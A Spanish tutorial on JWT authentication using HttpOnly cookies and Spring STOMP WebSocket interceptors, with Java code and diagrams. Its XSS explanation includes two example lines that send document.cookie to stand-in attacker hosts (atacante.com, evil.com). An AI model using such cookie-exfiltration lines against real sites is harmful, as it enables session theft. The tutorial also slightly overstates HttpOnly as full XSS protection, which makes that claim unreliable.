# Autenticación con HttpOnly Cookies y WebSocket STOMP

## Índice
1. [Conceptos Fundamentales](#conceptos-fundamentales)
2. [¿Por qué HttpOnly?](#por-qué-httponly)
3. [Arquitectura de WebSocket con Autenticación](#arquitectura-de-websocket-con-autenticación)
4. [Interceptores en STOMP](#interceptores-en-stomp)
5. [Flujo Completo de Autenticación WebSocket](#flujo-completo-de-autenticación-websocket)
6. [Componentes Implementados](#componentes-implementados)
7. [Problemas Comunes y Soluciones](#problemas-comunes-y-soluciones)

---

## Conceptos Fundamentales

### ¿Qué es una Cookie?
Una **cookie** es un pequeño fragmento de datos que el servidor envía al navegador del usuario. El navegador la almacena y la envía automáticamente en cada petición subsiguiente al mismo dominio.

```
┌──────────────────────────────────────────────────────────────┐
│                    Anatomía de una Cookie                     │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  Set-Cookie: accessToken=eyJhbGc...; Path=/; HttpOnly;       │
│              SameSite=Lax; Max-Age=36000                     │
│                                                               │
│  ┌─────────────┬──────────────────────────────────────────┐  │
│  │ accessToken │ Nombre de la cookie                      │  │
│  ├─────────────┼──────────────────────────────────────────┤  │
│  │ eyJhbGc...  │ Valor (el token JWT)                     │  │
│  ├─────────────┼──────────────────────────────────────────┤  │
│  │ Path=/      │ Disponible en toda la aplicación         │  │
│  ├─────────────┼──────────────────────────────────────────┤  │
│  │ HttpOnly    │ NO accesible desde JavaScript           │  │
│  ├─────────────┼──────────────────────────────────────────┤  │
│  │ SameSite    │ Protección contra CSRF                  │  │
│  ├─────────────┼──────────────────────────────────────────┤  │
│  │ Max-Age     │ Tiempo de vida en segundos (10 horas)   │  │
│  └─────────────┴──────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

### ¿Qué es HttpOnly?
**HttpOnly** es un flag de seguridad que previene que JavaScript acceda a la cookie.

```
┌─────────────────────────────────────────────────────────────┐
│                    Sin HttpOnly (VULNERABLE)                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  // Un script malicioso puede robar el token:               │
│  const token = document.cookie;  // ⚠️ ACCESIBLE            │
│  fetch('https://atacante.com/robar?token=' + token);        │
│                                                              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    Con HttpOnly (SEGURO)                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  // JavaScript NO puede acceder:                            │
│  const token = document.cookie;  // ❌ VACÍO                │
│                                                              │
│  // Pero el navegador SÍ la envía automáticamente:          │
│  fetch('/api/datos', { credentials: 'include' });           │
│  // Cookie enviada automáticamente ✅                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### ¿Qué es SameSite?
**SameSite** es un atributo que controla cuándo se envía la cookie:

| Valor | Comportamiento |
|-------|----------------|
| `Strict` | Solo se envía en peticiones del mismo sitio |
| `Lax` | Se envía en navegación de nivel superior (clicks en links) |
| `None` | Se envía siempre (requiere `Secure=true`) |

### ¿Qué es STOMP?
**STOMP (Simple Text Oriented Messaging Protocol)** es un protocolo de mensajería simple que funciona sobre WebSocket.

```
┌─────────────────────────────────────────────────────────────┐
│                    Capas de Comunicación                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │                      STOMP                           │    │
│  │         (Mensajes estructurados con destinos)        │    │
│  └───────────────────────┬─────────────────────────────┘    │
│                          │                                   │
│  ┌───────────────────────▼─────────────────────────────┐    │
│  │                    WebSocket                         │    │
│  │           (Conexión bidireccional)                   │    │
│  └───────────────────────┬─────────────────────────────┘    │
│                          │                                   │
│  ┌───────────────────────▼─────────────────────────────┐    │
│  │                    HTTP/TCP                          │    │
│  │              (Transporte base)                       │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### ¿Qué es un Principal?
El **Principal** representa la identidad del usuario autenticado en el contexto de seguridad. En Spring Security, es el objeto que contiene la información del usuario actual.

```java
// El principal puede ser:
// 1. Un String (correo/username)
// 2. Un objeto UserDetails
// 3. Un objeto personalizado (Usuario)

// Obtener el principal:
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
String correo = auth.getName();  // Obtiene el nombre del principal
```

---

## ¿Por qué HttpOnly?

### Ataques XSS (Cross-Site Scripting)
Un ataque **XSS** ocurre cuando un atacante inyecta código JavaScript malicioso en tu sitio web.

```
┌─────────────────────────────────────────────────────────────┐
│                    Escenario de Ataque XSS                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Atacante encuentra vulnerabilidad XSS                   │
│     └─▶ Campo de comentarios sin sanitizar                  │
│                                                              │
│  2. Inyecta script malicioso:                               │
│     <script>                                                 │
│       fetch('https://evil.com/steal?t=' + document.cookie); │
│     </script>                                                │
│                                                              │
│  3. Víctima visita la página                                │
│     └─▶ Script se ejecuta en su navegador                  │
│                                                              │
│  4. SIN HttpOnly: Token enviado al atacante ⚠️              │
│     CON HttpOnly: document.cookie está vacío ✅             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Comparación de Almacenamiento de Tokens

| Método | XSS Vulnerable | CSRF Vulnerable | Recomendado |
|--------|----------------|-----------------|-------------|
| localStorage | ✅ Sí | ❌ No | ⚠️ No |
| sessionStorage | ✅ Sí | ❌ No | ⚠️ No |
| Cookie normal | ✅ Sí | ✅ Sí | ❌ No |
| Cookie HttpOnly + SameSite | ❌ No | ❌ No | ✅ Sí |

---

## Arquitectura de WebSocket con Autenticación

### El Problema
WebSocket no envía cookies de la misma manera que HTTP. El handshake inicial sí las incluye, pero los frames STOMP posteriores no tienen acceso directo a ellas.

### La Solución: Interceptores en Dos Capas

```
┌─────────────────────────────────────────────────────────────────┐
│                  Flujo de Autenticación WebSocket               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CAPA 1: HTTP Handshake                                         │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  WsJwtHandshakeInterceptor                               │    │
│  │  ─────────────────────────                               │    │
│  │  • Intercepta la petición HTTP de upgrade                │    │
│  │  • Extrae el JWT de la cookie                            │    │
│  │  • Valida el token y extrae el correo                    │    │
│  │  • Guarda el correo en sessionAttributes                 │    │
│  └─────────────────────────────────────────────────────────┘    │
│                           │                                      │
│                           ▼                                      │
│  CAPA 2: STOMP Messages                                         │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  StompAuthChannelInterceptor                             │    │
│  │  ───────────────────────────                             │    │
│  │  • Intercepta el comando CONNECT de STOMP                │    │
│  │  • Lee el correo de sessionAttributes                    │    │
│  │  • Busca el usuario en la base de datos                  │    │
│  │  • Valida el rol del usuario                             │    │
│  │  • Crea y asigna el Principal (Authentication)           │    │
│  └─────────────────────────────────────────────────────────┘    │
│                           │                                      │
│                           ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │            Conexión WebSocket Autenticada                │    │
│  │            ──────────────────────────────                │    │
│  │  • Usuario identificado                                  │    │
│  │  • Puede enviar/recibir mensajes                        │    │
│  │  • Puede recibir notificaciones personalizadas          │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Interceptores en STOMP

### ¿Qué es un Interceptor?
Un **interceptor** es un componente que se ejecuta antes o después de una operación, permitiendo agregar lógica transversal (como autenticación, logging, etc.).

### 1. HandshakeInterceptor (Capa HTTP)

**Archivo:** `WsJwtHandshakeInterceptor.java`

Este interceptor actúa durante el **handshake HTTP** que establece la conexión WebSocket.

```java
@Component
@RequiredArgsConstructor
public class WsJwtHandshakeInterceptor implements HandshakeInterceptor {
    private final JwtServices jwtServices;

    @Override
    public boolean beforeHandshake(
            ServerHttpRequest request, 
            ServerHttpResponse response,
            WebSocketHandler wsHandler, 
            Map<String, Object> attributes  // ← Aquí guardamos datos
    ) throws Exception {
        
        // 1. Obtener la request HTTP original
        if (request instanceof ServletServerHttpRequest servletRequest) {
            HttpServletRequest req = servletRequest.getServletRequest();
            
            // 2. Buscar la cookie con el token
            if (req.getCookies() != null) {
                for (Cookie c : req.getCookies()) {
                    if ("accessToken".equals(c.getName())) {
                        // 3. Extraer el correo del token
                        String correo = jwtServices.extraerCorreo(c.getValue());
                        
                        // 4. Guardar en attributes (disponible en STOMP)
                        attributes.put("ws_user_email", correo);
                    }
                }
            }
        }
        return true;  // Permitir el handshake
    }
}
```

**Diagrama del proceso:**
```
┌──────────────────────────────────────────────────────────────┐
│                    beforeHandshake()                          │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  HTTP Request                                                 │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ GET /ws-metro HTTP/1.1                                   │ │
│  │ Upgrade: websocket                                       │ │
│  │ Cookie: accessToken=eyJhbGciOiJIUzI1...                 │ │
│  └─────────────────────────────────────────────────────────┘ │
│                           │                                   │
│                           ▼                                   │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ 1. Extraer cookie "accessToken"                         │ │
│  │ 2. jwtServices.extraerCorreo(token)                     │ │
│  │ 3. attributes.put("ws_user_email", correo)              │ │
│  └─────────────────────────────────────────────────────────┘ │
│                           │                                   │
│                           ▼                                   │
│  Session Attributes: { ws_user_email: "user@email.com" }     │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### 2. ChannelInterceptor (Capa STOMP)

**Archivo:** `StompAuthChannelInterceptor.java`

Este interceptor actúa cuando llegan **mensajes STOMP**, especialmente durante el comando `CONNECT`.

```java
@Component
@RequiredArgsConstructor
@Slf4j
public class StompAuthChannelInterceptor implements ChannelInterceptor {
    private final UsuarioRepository usuarioRepository;

    @Override
    public Message<?> preSend(Message<?> message, MessageChannel channel) {
        StompHeaderAccessor accessor = MessageHeaderAccessor
            .getAccessor(message, StompHeaderAccessor.class);

        // Solo procesamos el comando CONNECT
        if (accessor != null && StompCommand.CONNECT.equals(accessor.getCommand())) {
            
            // 1. Obtener el correo guardado en el handshake
            Map<String, Object> attrs = accessor.getSessionAttributes();
            String correo = attrs != null ? (String) attrs.get("ws_user_email") : null;

            if (correo == null || correo.isBlank()) {
                throw new RuntimeException("No autorizado para WebSocket");
            }

            // 2. Buscar el usuario en la base de datos
            Usuario usuario = usuarioRepository.findByCorreo(correo)
                    .orElseThrow(() -> new RuntimeException("Usuario no encontrado"));

            // 3. Validar el rol (solo PASAJERO puede conectarse)
            String rol = usuario.getRol().getNombre();
            if (!"PASAJERO".equalsIgnoreCase(rol)) {
                throw new RuntimeException("Rol no autorizado para este canal");
            }

            // 4. Crear el objeto Authentication (Principal)
            var auth = new UsernamePasswordAuthenticationToken(
                    usuario.getCorreo(),      // Principal (identidad)
                    null,                      // Credentials (no necesarias)
                    List.of(new SimpleGrantedAuthority("ROLE_" + rol))
            );

            // 5. Asignar el usuario a la sesión STOMP
            accessor.setUser(auth);
            log.info("STOMP user autenticado: {}", auth.getName());
        }

        return message;
    }
}
```

**Diagrama del proceso:**
```
┌──────────────────────────────────────────────────────────────┐
│                       preSend()                               │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  STOMP Frame: CONNECT                                         │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ CONNECT                                                  │ │
│  │ accept-version:1.2                                       │ │
│  │ heart-beat:10000,10000                                   │ │
│  └─────────────────────────────────────────────────────────┘ │
│                           │                                   │
│                           ▼                                   │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ 1. Leer correo de sessionAttributes                     │ │
│  │ 2. usuarioRepository.findByCorreo(correo)               │ │
│  │ 3. Validar rol == "PASAJERO"                            │ │
│  │ 4. Crear UsernamePasswordAuthenticationToken            │ │
│  │ 5. accessor.setUser(auth)                               │ │
│  └─────────────────────────────────────────────────────────┘ │
│                           │                                   │
│                           ▼                                   │
│  Principal asignado: user@email.com con ROLE_PASAJERO        │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## Flujo Completo de Autenticación WebSocket

```
┌─────────┐                ┌────────────────┐                ┌─────────────┐
│ Browser │                │    Backend     │                │  Database   │
└────┬────┘                └───────┬────────┘                └──────┬──────┘
     │                             │                                │
     │ 1. HTTP GET /ws-metro       │                                │
     │    Cookie: accessToken=xxx  │                                │
     │────────────────────────────▶│                                │
     │                             │                                │
     │         ┌───────────────────┴───────────────────┐            │
     │         │ WsJwtHandshakeInterceptor             │            │
     │         │ ─────────────────────────             │            │
     │         │ • Extrae token de cookie              │            │
     │         │ • Valida JWT                          │            │
     │         │ • Guarda correo en sessionAttributes  │            │
     │         └───────────────────┬───────────────────┘            │
     │                             │                                │
     │◀────────────────────────────│                                │
     │ 2. HTTP 101 Switching       │                                │
     │    Protocols                │                                │
     │                             │                                │
     │═══════════════════════════════════════════════════           │
     │        WebSocket Connection Established                      │
     │═══════════════════════════════════════════════════           │
     │                             │                                │
     │ 3. STOMP CONNECT            │                                │
     │────────────────────────────▶│                                │
     │                             │                                │
     │         ┌───────────────────┴───────────────────┐            │
     │         │ StompAuthChannelInterceptor           │            │
     │         │ ────────────────────────              │            │
     │         │ • Lee correo de sessionAttributes     │            │
     │         │ • Busca usuario en BD ────────────────┼───────────▶│
     │         │                                       │◀───────────│
     │         │ • Valida rol (PASAJERO)               │            │
     │         │ • Crea Authentication                 │            │
     │         │ • Asigna como Principal               │            │
     │         └───────────────────┬───────────────────┘            │
     │                             │                                │
     │◀────────────────────────────│                                │
     │ 4. STOMP CONNECTED          │                                │
     │                             │                                │
     │═══════════════════════════════════════════════════           │
     │          Usuario Autenticado en WebSocket                    │
     │═══════════════════════════════════════════════════           │
     │                             │                                │
     │ 5. SUBSCRIBE /user/queue/   │                                │
     │    notificaciones           │                                │
     │────────────────────────────▶│                                │
     │                             │                                │
     │        (El servidor conoce  │                                │
     │         quién es el usuario)│                                │
     │                             │                                │
     │◀────────────────────────────│                                │
     │ 6. MESSAGE (notificación    │                                │
     │    personalizada)           │                                │
     │                             │                                │
```

---

## Componentes Implementados

### Configuración de WebSocket

**Archivo:** `WebSocketConfig.java`

```java
@Configuration
@EnableWebSocketMessageBroker
@RequiredArgsConstructor
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
    
    private final StompAuthChannelInterceptor stompAuthChannelInterceptor;
    private final WsJwtHandshakeInterceptor wsJwtHandshakeInterceptor;

    // Registrar el interceptor de canal (STOMP)
    @Override
    public void configureClientInboundChannel(ChannelRegistration registration) {
        registration.interceptors(stompAuthChannelInterceptor);
    }

    // Configurar endpoint con interceptor de handshake
    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/ws-metro")
                .addInterceptors(wsJwtHandshakeInterceptor)  // ← Handshake
                .setAllowedOriginPatterns("http://localhost:5173")
                .withSockJS();
    }

    // Configurar broker de mensajes
    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        // Destinos para enviar desde servidor → cliente
        config.enableSimpleBroker("/topic", "/queue");
        
        // Prefijo para mensajes cliente → servidor
        config.setApplicationDestinationPrefixes("/app");
        
        // Prefijo para mensajes específicos de usuario
        config.setUserDestinationPrefix("/user");
    }
}
```

### Envío de Notificaciones Personalizadas

**Archivo:** `WebSocketNotificationHub.java`

```java
@Service
@RequiredArgsConstructor
public class WebSocketNotificationHub implements IUserNotifier {
    
    private final SimpMessagingTemplate template;

    // Envía mensaje a un usuario específico
    @Override
    public void enviarAUsuario(String username, Object payload) {
        // Usa el Principal para identificar al usuario
        template.convertAndSendToUser(
            username,                    // El correo del usuario
            "/queue/notificaciones",     // Destino
            payload                      // Contenido del mensaje
        );
    }
}
```

**¿Cómo funciona `convertAndSendToUser`?**
```
┌─────────────────────────────────────────────────────────────┐
│                  convertAndSendToUser()                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Llamada:                                                    │
│  template.convertAndSendToUser(                              │
│      "user@email.com",      // username (Principal)          │
│      "/queue/notificaciones",                                │
│      notificacion                                            │
│  );                                                          │
│                                                              │
│  Spring convierte internamente a:                            │
│  ─────────────────────────────────                           │
│  /user/user@email.com/queue/notificaciones                   │
│                                                              │
│  El cliente se suscribe a:                                   │
│  ──────────────────────────                                  │
│  /user/queue/notificaciones  (Spring resuelve el usuario)    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Problemas Comunes y Soluciones

### 1. Cookie no se envía en WebSocket

**Problema:** El handshake no recibe la cookie.

**Solución:** Verificar configuración CORS y SockJS:
```javascript
// Frontend (JavaScript)
const socket = new SockJS('http://localhost:8080/ws-metro', null, {
    withCredentials: true  // ← Importante
});
```

### 2. Nombre de cookie inconsistente

**Problema:** El login crea `accessToken` pero el interceptor busca `access_token`.

**Solución:** Usar el mismo nombre en todos los lugares:
```java
// AuthController.java
ResponseCookie.from("accessToken", auth.getToken())  // ← Nombre

// WsJwtHandshakeInterceptor.java
if ("accessToken".equals(c.getName()))  // ← Mismo nombre
```

### 3. Usuario no autenticado en STOMP

**Problema:** `accessor.getUser()` retorna `null`.

**Verificar:**
1. El handshake interceptor guarda el correo correctamente
2. El channel interceptor asigna el usuario con `accessor.setUser(auth)`
3. El usuario existe en la base de datos

### 4. No recibe mensajes personalizados

**Problema:** `convertAndSendToUser` no llega al cliente.

**Verificar:**
1. El cliente se suscribe a `/user/queue/notificaciones`
2. El Principal está configurado correctamente
3. El username usado coincide con `auth.getName()`

---

## Comparación: HTTP vs WebSocket Auth

| Aspecto | HTTP (JwtFilter) | WebSocket (Interceptors) |
|---------|------------------|--------------------------|
| **Momento** | Cada petición | Solo al conectar |
| **Dónde se guarda** | SecurityContextHolder | STOMP Session |
| **Cómo se obtiene** | `SecurityContextHolder.getContext()` | `accessor.getUser()` |
| **Filtro/Interceptor** | `OncePerRequestFilter` | `HandshakeInterceptor` + `ChannelInterceptor` |
| **Cookies** | Acceso directo | Solo en handshake |

---

## Buenas Prácticas

1. **Validar en ambas capas**: Tanto en handshake como en STOMP CONNECT
2. **Logging**: Registrar conexiones exitosas y fallidas
3. **Timeouts**: Configurar heartbeat para detectar conexiones muertas
4. **Roles específicos**: Limitar qué roles pueden usar WebSocket
5. **Manejo de errores**: Rechazar conexiones no autorizadas limpiamente

---

## Referencias

- [Spring WebSocket Documentation](https://docs.spring.io/spring-framework/reference/web/websocket.html)
- [STOMP Protocol Specification](https://stomp.github.io/stomp-specification-1.2.html)
- [OWASP WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
- [SockJS Documentation](https://github.com/sockjs/sockjs-client)

